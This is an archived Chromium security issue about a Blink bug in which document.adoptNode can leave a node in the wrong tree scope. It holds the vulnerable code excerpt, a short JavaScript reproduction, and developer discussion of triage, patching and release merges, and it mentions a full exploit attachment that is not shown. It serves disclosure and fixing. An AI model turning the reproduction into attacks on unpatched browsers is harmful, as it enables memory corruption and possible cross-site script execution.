# Security: Universal XSS using document.adoptNode

| Field | Value |
|-------|-------|
| **Issue ID** | [40083005](https://issues.chromium.org/issues/40083005) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>HTML |
| **Reporter** | ma...@gmail.com |
| **Assignee** | do...@chromium.org |
| **Created** | 2015-10-08 |
| **Bounty** | $7,500.00 |

## Description

## **VULNERABILITY DETAILS** From /third\_party/WebKit/Source/core/dom/Document.cpp:

PassRefPtrWillBeRawPtr<Node> Document::adoptNode(PassRefPtrWillBeRawPtr<Node> source, ExceptionState& exceptionState)  

{  

EventQueueScope scope;

```
switch (source->nodeType()) {  

```

(...)  

default:  

(...)  

if (source->parentNode()) {  

source->parentNode()->removeChild(source.get(), exceptionState);  

if (exceptionState.hadException())  

return nullptr;  

}  

}

```
this->adoptIfNeeded(\*source);  

return source;  

```
## }

This code expects that |removeChild(source.get(), exceptionState)| will either detach the source node or throw an exception if it can't be done. However, the child can be reattached immediately after removal (through HTMLScriptElement::childrenChanged) if the parent node is a pending script whose type has recently changed to valid. In such case, ContainerNode::removeChild doesn't throw any exception. Consequently, the adopted node will end up in a wrong tree scope, which may lead to GC crashes and inconsistent frame states.

**VERSION**  

Chrome 45.0.2454.101 (Stable)  

Chrome 46.0.2490.64 (Beta)  

Chrome 47.0.2526.5 (Dev)  

Chromium 48.0.2531.0 (Release build compiled today)

**REPRODUCTION CASE**

<script>
var s = document.createElement('script');
s.type = '0';
s.textContent = 's.appendChild(x)';
document.documentElement.appendChild(s);
var x = document.createElement('x');
s.appendChild(x);
s.type = '';
var i = document.documentElement.appendChild(document.createElement('iframe'));
i.contentDocument.adoptNode(x);
alert(x.ownerDocument === x.parentNode.ownerDocument);
</script>

## Attachments

- [exploit.zip](attachments/exploit.zip) (application/zip, 1.1 KB)

## Timeline

### aa...@google.com (2015-10-08)

[Empty comment from Monorail migration]

### fe...@chromium.org (2015-10-08)

[Empty comment from Monorail migration]

### fe...@chromium.org (2015-10-09)

eae@, might you be a good owner of this bug?

### ea...@chromium.org (2015-10-09)

More of a DOM issue, been a couple of years since I last touched the node attach code. Assigning to dominicc for triage. Assign back to me if you can't find an appropriate owner.

### do...@chromium.org (2015-10-19)

FWIW this hits a DEBUG assert:

ASSERTION FAILED: document().inStyleRecalc()
../../third_party/WebKit/Source/core/dom/Element.cpp(1521) : virtual void blink:
:Element::attach(const blink::Node::AttachContext &)

I also don't think it is exactly right to call this universal XSS. Can a cross-site reach into frame.contentDocument.adoptNode?

### ma...@gmail.com (2015-10-19)

Please see exploit.zip for the full context. The exploit isn't adopting into a cross-origin document, adoptNode is used to put a node in a wrong tree scope (of a different same-origin document), as shown in the minimized testcase. Having nodes attached to the DOM tree of document A and owned by document B confuses code all over the place (I saw several different crashes, including GC assertions, while working on this). For example, Node::containsIncludingShadowDOM will return false for nodes containing the corrupted node (which is sort of "correct", because containing->document() != corrupted->document()), which may leave frames in an inconsistent state.

### do...@chromium.org (2015-10-20)

I totally agree this is a bug, and thanks for filing something so detailed. I just don't think this leads to *XSS*. I have this up in the debugger right now. Thank you for filing this.

### do...@chromium.org (2015-10-21)

I think it is an error that Chrome runs the script when it does. I'm looking at HTML spec's "prepare a script" [1]; I think we are misinterpreting this rule:

"The script element is in a Document and a node or document fragment is inserted into the script element, after any script elements inserted at that time." [2]

By indiscriminately processing Element::childrenChanged we are running the script when adoptNode *removes* an element. We should scrutinize the kind of change. It does raise the question if there are other ways to tickle this pattern of calls though (maybe replace?)

[1] https://html.spec.whatwg.org/multipage/scripting.html#prepare-a-script
[2] https://html.spec.whatwg.org/multipage/scripting.html#the-script-element:prepare-a-script-2

### do...@chromium.org (2015-10-22)

Patch up at https://codereview.chromium.org/1414503006

### ha...@chromium.org (2015-10-22)

[Empty comment from Monorail migration]

### ke...@chromium.org (2015-10-22)

[Empty comment from Monorail migration]

### do...@chromium.org (2015-10-23)

I think this may be a dup of https://crbug.com/chromium/539510.

### cl...@chromium.org (2015-10-23)

[Empty comment from Monorail migration]

### ma...@gmail.com (2015-10-23)

Could you please CC me on that bug? Thanks.

### in...@chromium.org (2015-10-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-10-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-10-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-10-23)

Fixed by https://code.google.com/p/chromium/issues/detail?id=539510#c11

### cl...@chromium.org (2015-10-23)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### do...@chromium.org (2015-10-27)

Should we merge this all the way to stable?

I looked at crashes and I see no adoptNode crashes after this change, so I think this is safe to merge.

### in...@chromium.org (2015-10-27)

Yes, please do. wait a couple of days for it to bake. see c#19 :)

### do...@chromium.org (2015-10-29)

OK. I guess we start with Dev.

### ti...@google.com (2015-10-30)

Congrats your change is auto-approved for M48 (branch: 2550)

### do...@chromium.org (2015-11-05)

Hmm, this change is already on branch 2550.

### ss...@google.com (2015-11-05)

Adding Windows label. Please change if inappropriate.

### ti...@google.com (2015-11-05)

M48 hasn't branched yet, no need to request merge, removed related label.

### ti...@google.com (2015-11-06)

Congrats your change is auto-approved for M47 (branch: 2526)

### do...@chromium.org (2015-11-10)

[Empty comment from Monorail migration]

### do...@chromium.org (2015-11-12)

I merged this onto 2526, see the comment here:

https://code.google.com/p/chromium/issues/detail?id=539510#c13

Bugdroid is posting over there because the original patch landed with BUG=539510 before these were de-duped the other way; for context see:

https://code.google.com/p/chromium/issues/detail?id=539510#c10

### ss...@google.com (2015-11-16)

Removing Merge-Approved-47 label since this has been merged already.

### do...@chromium.org (2015-11-17)

I assume because of the M47 label we should not merge this to M46?

### ti...@google.com (2015-11-23)

#31: M46 isn't receiving another patch, so I'll take the label off.

### ti...@google.com (2015-12-01)

I'll add this to your tab ;)

### cl...@chromium.org (2016-01-29)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2016-06-17)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-17)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/541206?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/539510]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083005)*
